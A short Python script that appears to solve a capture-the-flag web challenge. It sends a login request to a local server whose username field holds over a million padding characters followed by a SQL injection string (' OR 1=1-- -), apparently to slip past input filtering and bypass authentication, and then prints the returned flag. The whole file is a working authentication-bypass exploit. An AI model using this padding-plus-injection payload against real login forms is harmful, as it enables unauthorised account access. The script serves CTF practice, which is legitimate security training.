import requests

def main():
    url = "http://localhost:1234/"
    payload = 'A' * 1000001
    payload += '\' OR 1=1-- -'
    data = {
        "username": payload,
        "password": 'bl4ck0ut',
        'login-submit': ''
    }
    response = requests.post(url, data=data)
    if '0xL4ugh{' not in response.text:
        print(f"[-] The exploit failed")
        return
    
    flag = response.text.split('\n')[0].strip()
    print(f"[+] Done Exploit Flag Successfully:\n{flag}")

if __name__ == "__main__":
    main()
